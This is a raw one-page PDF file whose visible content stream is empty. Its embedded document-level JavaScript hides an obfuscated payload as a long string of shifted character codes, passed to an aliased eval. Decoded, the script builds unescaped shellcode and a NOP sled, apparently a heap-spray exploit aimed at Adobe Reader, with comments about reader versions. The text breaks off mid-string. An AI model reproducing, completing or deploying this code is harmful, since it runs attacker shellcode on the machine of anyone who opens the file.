%PDF-1.3
3 0 obj
<</Type /Page
/Parent 1 0 R
/Resources 2 0 R
/Contents 4 0 R>>
endobj
4 0 obj
<</Filter /FlateDecode /Length 25333>>
stream
endstream
endobj
1 0 obj
<</Type /Pages
/Kids [3 0 R ]
/Count 1
/MediaBox [0 0 300.00 400.00]
>>
endobj
5 0 obj
<</Type /Font
/BaseFont /Helvetica
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
2 0 obj
<<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 5 0 R
>>
/XObject <<
>>
>>
endobj
6 0 obj
<<
/Names [(HtYfjPssa) 7 0 R ]
>>
endobj
7 0 obj
<<
/S /JavaScript
/JS (
var fg = eval;
var yu="error"; var s = "20 128 107 124 42 122 107 131 118 121 107 110 42 71 42 127 120 111 125 109 107 122 111 50 44 47 127 58 75 58 75 47 127 58 75 58 75 47 127 58 75 58 75 44 53 44 47 127 79 59 78 67 47 127 61 62 78 67 47 127 63 66 60 62 47 127 63 66 63 66 47 127 61 61 63 66 47 127 76 61 78 76 47 127 58 61 59 77 47 127 61 59 77 61 47 127 64 64 77 67 47 127 79 67 66 59 47 127 80 75 64 63 47 127 61 58 66 58 47 127 62 58 60 59 47 127 80 75 79 60 47 127 59 65 77 67 47 127 60 59 60 60 47 127 62 67 60 59 47 127 58 59 60 59 47 127 60 59 60 59 47 127 60 59 62 76 47 127 80 59 78 79 47 127 60 59 67 66 47 127 60 59 61 59 47 127 75 75 60 59 47 127 77 75 78 67 47 127 65 80 60 62 47 127 66 63 78 60 47 127 80 59 78 79 47 127 78 65 77 67 47 127 78 79 78 79 47 127 77 67 78 79 47 127 60 60 59 77 47 127 60 59 60 59 47 127 78 67 75 75 47 127 59 67 77 67 47 127 60 59 60 59 47 127 77 67 60 59 47 127 60 58 64 77 47 127 60 59 60 59 47 127 64 65 77 67 47 127 60 59 60 59 47 127 77 67 60 59 47 127 60 60 80 75 47 127 60 59 60 59 47 127 78 67 75 75 47 127 58 61 77 67 47 127 60 59 60 59 47 127 77 67 60 59 47 127 60 58 64 63 47 127 60 59 60 59 47 127 59 59 77 67 47 127 60 59 60 59 47 127 77 67 60 59 47 127 60 60 75 66 47 127 60 59 60 59 47 127 78 67 75 75 47 127 60 78 77 67 47 127 60 59 60 59 47 127 77 67 60 59 47 127 60 58 62 58 47 127 60 59 60 59 47 127 61 76 77 67 47 127 60 59 60 59 47 127 77 75 60 59 47 127 65 60 65 67 47 127 80 78 75 75 47 127 62 76 65 60 47 127 62 67 64 59 47 127 61 59 60 59 47 127 60 59 60 59 47 127 77 67 65 64 47 127 60 61 67 58 47 127 60 59 60 59 47 127 77 62 77 67 47 127 60 59 60 59 47 127 65 67 60 59 47 127 65 60 79 60 47 127 80 78 75 75 47 127 62 76 65 60 47 127 62 67 58 59 47 127 61 59 60 59 47 127 60 59 60 59 47 127 77 67 65 64 47 127 60 61 76 66 47 127 60 59 60 59 47 127 79 77 77 67 47 127 60 59 60 59 47 127 65 67 60 59 47 127 65 64 79 60 47 127 59 78 77 67 47 127 60 59 60 63 47 127 75 75 60 59 47 127 59 60 78 67 47 127 64 66 79 66 47 127 79 59 59 60 47 127 79 60 67 59 47 127 78 61 78 78 47 127 75 77 66 80 47 127 78 79 64 64 47 127 79 60 65 79 47 127 59 80 65 75 47 127 60 64 79 65 47 127 59 80 67 67 47 127 65 79 75 66 47 127 62 65 60 58 47 127 79 64 59 80 47 127 60 62 64 64 47 127 77 59 78 79 47 127 77 66 79 60 47 127 60 63 76 62 47 127 60 59 60 59 47 127 75 58 65 75 47 127 61 63 77 78 47 127 60 59 60 58 47 127 75 75 60 59 47 127 59 80 80 63 47 127 60 61 79 64 47 127 62 77 62 60 47 127 58 59 62 63 47 127 79 64 59 80 47 127 60 63 64 61 47 127 62 60 58 79 47 127 58 61 58 59 47 127 79 61 75 60 47 127 59 60 60 67 47 127 65 59 79 59 47 127 62 67 65 59 47 127 60 58 60 63 47 127 60 59 60 59 47 127 65 60 65 61 47 127 77 67 65 59 47 127 60 60 79 58 47 127 60 59 60 59 47 127 80 59 78 79 47 127 78 78 75 75 47 127 79 64 75 75 47 127 79 59 75 60 47 127 59 80 60 67 47 127 61 67 75 76 47 127 80 75 75 63 47 127 60 60 63 63 47 127 77 75 64 59 47 127 59 80 78 65 47 127 60 59 79 65 47 127 59 60 58 61 47 127 59 80 80 61 47 127 65 59 75 67 47 127 75 60 60 58 47 127 65 63 77 78 47 127 79 59 59 60 47 127 80 75 59 60 47 127 79 78 75 75 47 127 78 67 75 60 47 127 63 77 65 63 47 127 59 80 60 66 47 127 61 78 75 66 47 127 75 60 60 58 47 127 60 63 79 59 47 127 78 61 77 75 47 127 79 78 75 75 47 127 80 66 75 75 47 127 79 60 75 60 47 127 59 60 61 59 47 127 59 80 79 59 47 127 64 60 79 64 47 127 60 58 58 78 47 127 60 59 60 59 47 127 65 58 60 59 47 127 65 59 65 60 47 127 65 59 65 59 47 127 65 59 65 59 47 127 65 64 65 59 47 127 77 67 65 59 47 127 60 60 59 66 47 127 60 59 60 59 47 127 61 66 77 67 47 127 60 59 60 59 47 127 62 63 60 59 47 127 60 63 66 58 47 127 60 59 60 59 47 127 75 77 60 59 47 127 62 59 66 59 47 127 78 79 78 79 47 127 77 67 78 79 47 127 60 60 59 64 47 127 60 59 60 59 47 127 80 75 59 60 47 127 65 60 65 60 47 127 65 60 65 60 47 127 80 59 78 79 47 127 59 67 75 59 47 127 75 59 77 67 47 127 77 66 59 67 47 127 60 79 63 62 47 127 63 67 75 58 47 127 76 59 60 62 47 127 76 59 76 59 47 127 63 63 76 59 47 127 65 62 60 65 47 127 77 78 75 75 47 127 64 59 75 77 47 127 78 79 60 62 47 127 77 67 77 59 47 127 78 79 58 80 47 127 78 79 78 79 47 127 77 67 79 60 47 127 78 79 58 67 47 127 78 79 78 79 47 127 61 58 67 67 47 127 60 63 60 58 47 127 79 61 75 59 47 127 60 59 60 78 47 127 61 75 77 67 47 127 78 79 78 79 47 127 59 60 78 79 47 127 65 59 79 59 47 127 77 67 65 63 47 127 60 59 65 63 47 127 60 59 60 59 47 127 77 67 65 59 47 127 60 61 75 75 47 127 60 59 60 59 47 127 80 59 78 79 47 127 75 59 59 65 47 127 58 63 59 78 47 127 63 64 60 59 47 127 77 67 60 76 47 127 60 61 64 58 47 127 60 59 60 59 47 127 78 79 59 60 47 127 78 79 65 64 47 127 77 67 80 59 47 127 60 58 78 75 47 127 60 59 60 59 47 127 78 79 62 67 47 127 60 59 60 59 47 127 78 79 60 59 47 127 77 67 80 59 47 127 78 80 77 67 47 127 78 79 78 79 47 127 65 64 65 60 47 127 59 60 65 65 47 127 65 59 79 59 47 127 77 67 65 63 47 127 60 59 61 80 47 127 60 59 60 59 47 127 77 67 65 59 47 127 60 61 65 62 47 127 60 59 60 59 47 127 80 59 78 79 47 127 75 59 59 65 47 127 58 63 59 78 47 127 63 64 60 59 47 127 77 67 60 76 47 127 60 61 60 75 47 127 60 59 60 59 47 127 78 79 59 60 47 127 78 79 65 64 47 127 65 67 80 59 47 127 65 79 65 80 47 127 79 60 65 75 47 127 60 61 77 75 47 127 79 60 65 67 47 127 78 66 77 67 47 127 78 79 78 79 47 127 65 65 78 79 47 127 75 60 65 64 47 127 60 67 77 78 47 127 78 78 75 75 47 127 60 67 62 76 47 127 59 80 65 64 47 127 63 64 78 79 47 127 77 67 61 63 47 127 60 61 65 77 47 127 60 59 60 59 47 127 80 59 78 79 47 127 78 78 75 75 47 127 62 58 62 67 47 127 62 62 62 77 47 127 62 67 60 59 47 127 64 62 64 66 47 127 63 61 64 65 47 127 78 63 75 75 47 127 60 67 67 66 47 127 60 59 60 59 47 127 78 60 60 59 47 127 63 62 66 65 47 127 62 76 58 79 47 127 59 80 60 59 47 127 63 63 78 79 47 127 58 59 58 63 47 127 58 63 77 67 47 127 60 59 60 61 47 127 78 79 60 59 47 127 75 75 80 59 47 127 77 67 78 67 47 127 60 58 79 75 47 127 60 59 60 59 47 127 80 59 78 79 47 127 78 67 59 75 47 127 60 67 63 63 47 127 75 75 59 65 47 127 58 63 64 63 47 127 59 80 58 59 47 127 60 59 78 79 47 127 78 79 59 80 47 127 58 63 63 63 47 127 77 67 61 78 47 127 60 58 77 79 47 127 60 59 60 59 47 127 80 59 78 79 47 127 79 63 75 60 47 127 65 79 61 59 47 127 67 67 65 80 47 127 60 59 60 58 47 127 60 59 60 59 47 127 62 67 79 60 47 127 62 80 62 79 47 127 60 59 60 59 47 127 63 62 62 67 47 127 62 78 63 61 47 127 77 75 62 77 47 127 75 77 61 62 47 127 58 63 64 63 47 127 65 59 60 63 47 127 58 61 77 67 47 127 78 79 78 80 47 127 65 59 78 79 47 127 64 76 77 67 47 127 60 59 60 61 47 127 77 66 60 59 47 127 78 80 77 61 47 127 78 79 78 79 47 127 77 65 77 67 47 127 78 79 78 79 47 127 75 60 78 79 47 127 60 67 79 63 47 127 62 76 79 60 47 127 62 67 62 78 47 127 63 63 62 80 47 127 62 78 62 63 47 127 61 62 77 75 47 127 64 63 75 77 47 127 60 63 58 63 47 127 77 67 65 59 47 127 78 77 78 75 47 127 78 79 78 79 47 127 77 67 65 59 47 127 60 61 58 60 47 127 60 59 60 59 47 127 67 75 77 66 47 127 78 79 78 80 47 127 77 67 78 79 47 127 78 79 77 65 47 127 78 79 78 79 47 127 79 63 75 60 47 127 79 60 60 67 47 127 59 60 62 67 47 127 60 59 59 61 47 127 62 67 60 59 47 127 63 60 63 62 47 127 63 61 62 62 47 127 61 62 77 75 47 127 64 63 75 77 47 127 60 63 58 63 47 127 77 67 65 59 47 127 78 77 80 58 47 127 78 79 78 79 47 127 77 67 65 59 47 127 60 58 78 66 47 127 60 59 60 59 47 127 76 58 77 66 47 127 78 79 78 80 47 127 77 67 78 79 47 127 78 79 77 65 47 127 78 79 78 79 47 127 79 63 75 60 47 127 79 60 60 67 47 127 62 60 62 67 47 127 63 64 63 65 47 127 62 67 60 59 47 127 62 67 63 60 47 127 62 79 62 63 47 127 61 62 77 75 47 127 64 63 75 77 47 127 60 63 58 63 47 127 77 67 65 59 47 127 78 77 66 64 47 127 78 79 78 79 47 127 77 67 65 59 47 127 60 58 79 79 47 127 60 59 60 59 47 127 62 64 77 66 47 127 78 79 78 80 47 127 77 67 78 79 47 127 78 79 77 65 47 127 78 79 78 79 47 127 79 63 75 60 47 127 79 60 60 67 47 127 63 65 62 67 47 127 63 67 62 64 47 127 77 75 60 59 47 127 75 77 61 62 47 127 58 63 64 63 47 127 65 59 60 63 47 127 75 61 77 67 47 127 78 79 78 77 47 127 65 59 78 79 47 127 66 76 77 67 47 127 60 59 60 58 47 127 77 66 60 59 47 127 78 80 64 61 47 127 78 79 78 79 47 127 77 65 77 67 47 127 78 79 78 79 47 127 75 60 78 79 47 127 60 63 79 63 47 127 77 67 79 60 47 127 60 58 66 75 47 127 60 59 60 59 47 127 61 75 62 67 47 127 64 65 79 65 47 127 65 59 63 66 47 127 79 65 77 67 47 127 60 59 60 58 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 60 58 76 64 47 127 60 59 60 59 47 127 77 78 62 67 47 127 60 60 76 64 47 127 65 59 60 78 47 127 67 61 77 67 47 127 60 59 60 58 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 60 58 75 60 47 127 60 59 60 59 47 127 66 76 62 67 47 127 60 77 78 78 47 127 65 59 63 78 47 127 76 80 77 67 47 127 60 59 60 58 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 60 58 62 79 47 127 60 59 60 59 47 127 77 77 62 67 47 127 77 79 65 65 47 127 65 59 59 65 47 127 75 76 77 67 47 127 60 59 60 58 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 60 58 65 75 47 127 60 59 60 59 47 127 78 59 62 67 47 127 60 63 75 76 47 127 65 59 65 79 47 127 63 65 77 67 47 127 60 59 60 58 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 78 80 78 64 47 127 78 79 78 79 47 127 63 67 62 67 47 127 80 75 62 67 47 127 65 59 61 78 47 127 62 61 77 67 47 127 60 59 60 58 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 60 58 59 60 47 127 60 59 60 59 47 127 77 79 62 67 47 127 77 59 79 80 47 127 65 59 62 59 47 127 64 80 77 67 47 127 60 59 60 58 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 60 58 61 79 47 127 60 59 60 59 47 127 67 59 62 67 47 127 58 77 64 66 47 127 65 59 80 75 47 127 59 76 77 67 47 127 60 59 60 58 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 78 79 59 65 47 127 78 79 78 79 47 127 66 75 62 67 47 127 76 75 65 80 47 127 65 59 61 80 47 127 58 65 77 67 47 127 60 59 60 58 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 78 80 66 64 47 127 78 79 78 79 47 127 65 66 62 67 47 127 75 58 76 64 47 127 65 59 60 61 47 127 61 61 77 67 47 127 60 59 60 58 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 60 59 77 60 47 127 60 59 60 59 47 127 63 80 62 67 47 127 77 61 80 67 47 127 65 59 63 60 47 127 78 80 77 67 47 127 60 59 60 59 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 60 59 79 79 47 127 60 59 60 59 47 127 76 80 62 67 47 127 67 75 78 66 47 127 65 59 59 62 47 127 77 76 77 67 47 127 60 59 60 59 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 78 80 76 61 47 127 78 79 78 79 47 127 65 64 62 67 47 127 67 62 66 59 47 127 65 59 67 75 47 127 80 65 77 67 47 127 60 59 60 59 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 78 80 63 80 47 127 78 79 78 79 47 127 61 76 62 67 47 127 61 80 63 76 47 127 65 59 60 61 47 127 79 61 77 67 47 127 60 59 60 59 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 78 80 62 76 47 127 78 79 78 79 47 127 77 59 62 67 47 127 59 59 65 75 47 127 65 59 76 63 47 127 66 80 77 67 47 127 60 59 60 59 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 78 80 65 65 47 127 78 79 78 79 47 127 76 64 62 67 47 127 77 61 79 66 47 127 65 59 66 60 47 127 76 76 77 67 47 127 60 59 60 59 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 78 80 64 61 47 127 78 79 78 79 47 127 62 67 62 67 47 127 79 62 58 63 47 127 65 59 67 60 47 127 75 65 77 67 47 127 60 59 60 59 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 60 59 65 64 47 127 60 59 60 59 47 127 63 61 62 67 47 127 67 60 78 80 47 127 65 59 61 65 47 127 63 61 77 67 47 127 60 59 60 59 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 78 80 64 63 47 127 78 79 78 79 47 127 61 60 77 75 47 127 62 62 62 76 47 127 77 67 65 59 47 127 78 75 78 64 47 127 78 79 78 79 47 127 77 67 65 59 47 127 78 80 66 75 47 127 78 79 78 79 47 127 67 64 77 66 47 127 78 79 78 78 47 127 77 67 78 79 47 127 78 79 77 67 47 127 78 79 78 79 47 127 77 67 79 60 47 127 78 77 66 66 47 127 78 79 78 79 47 127 64 79 62 67 47 127 64 79 77 79 47 127 65 59 60 62 47 127 59 80 77 67 47 127 60 59 60 59 47 127 75 60 60 59 47 127 60 67 79 63 47 127 77 67 79 60 47 127 60 59 60 79 47 127 60 59 60 59 47 127 75 80 62 67 47 127 60 80 64 80 47 127 65 59 77 78 47 127 58 76 77 67 47 127 60 59 60 59 47 127 75 60 60 59 47 127 60 67 79 63 47 127 59 60 79 60 47 127 62 63 79 59 47 127 64 59 75 75 47 127 75 62 59 59 47 127 63 67 79 59 47 127 59 80 61 59 47 127 64 59 75 75 47 127 59 80 60 78 47 127 63 59 75 75 47 127 66 77 61 78 47 127 75 75 59 80 47 127 60 67 64 59 47 127 77 75 79 60 47 127 59 80 60 75 47 127 64 59 75 75 47 127 75 60 59 63 47 127 63 78 79 59 47 127 75 75 59 80 47 127 59 78 64 59 47 127 62 59 79 60 47 127 75 75 59 65 47 127 58 63 62 78 47 127 59 65 58 63 47 127 64 62 75 75 47 127 59 65 59 78 47 127 65 63 75 75 47 127 63 67 60 62 47 127 80 62 60 60 47 127 75 75 59 80 47 127 61 67 64 76 47 127 75 75 59 80 47 127 58 59 65 76 47 127 80 77 60 60 47 127 59 75 77 60 47 127 59 80 64 66 47 127 59 63 75 75 47 127 60 60 75 75 47 127 59 60 78 62 47 127 59 60 78 79 47 127 78 78 79 59 47 127 75 63 66 78 47 127 63 63 79 59 47 127 79 58 60 64 47 127 60 77 79 79 47 127 78 67 60 60 47 127 78 63 77 75 47 127 59 75 59 65 47 127 58 63 63 78 47 127 63 62 58 67 47 127 59 80 80 79 47 127 65 76 75 75 47 127 60 60 58 63 47 127 62 65 80 77 47 127 75 75 59 80 47 127 64 75 60 78 47 127 75 75 59 80 47 127 61 78 65 76 47 127 80 77 60 60 47 127 75 75 59 80 47 127 75 75 60 63 47 127 79 62 60 60 47 127 75 66 59 65 47 127 58 63 64 63 47 127 62 58 61 78 47 127 77 67 79 60 47 127 78 75 62 65 47 127 78 79 78 79 47 127 63 63 62 67 47 127 63 59 63 63 47 127 58 79 59 76 47 127 62 61 58 79 47 127 62 63 62 66 47 127 63 63 63 60 47 127 62 58 63 61 47 127 62 62 62 65 47 127 58 80 62 80 47 127 62 79 62 60 47 127 58 79 62 77 47 127 62 77 62 66 47 127 58 79 62 64 47 127 63 62 62 79 47 127 63 63 62 62 47 127 63 59 58 80 47 127 63 59 62 67 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 60 59 60 59 47 127 58 58 60 59 44 51 69 20 57 57 55 55 55 55 55 55 55 20 128 107 124 42 119 111 119 121 124 131 69 20 112 127 120 109 126 115 121 120 42 88 111 129 105 93 109 124 115 122 126 50 122 107 131 118 121 107 110 51 20 133 20 57 57 128 107 124 42 122 107 131 118 121 107 110 69 20 57 57 115 112 50 107 110 121 108 111 67 51 57 57 107 110 121 108 111 42 124 111 107 110 111 124 42 66 42 129 121 124 117 125 42 107 118 125 121 42 129 115 126 114 42 107 122 122 56 125 111 126 94 115 119 111 89 127 126 73 20 57 57 128 107 124 42 125 126 107 124 126 129 115 126 114 42 71 42 107 122 122 56 107 118 111 124 126 50 49 82 115 49 51 69 57 57 124 111 123 127 115 124 111 110 42 112 121 124 42 107 110 121 108 111 67 20 42 128 107 124 42 120 121 122 42 71 42 127 120 111 125 109 107 122 111 50 44 102 47 127 67 58 67 58 102 47 127 67 58 67 58 44 51 69 42 57 57 118 121 120 113 42 120 121 122 42 129 115 118 118 42 107 118 125 121 42 112 121 12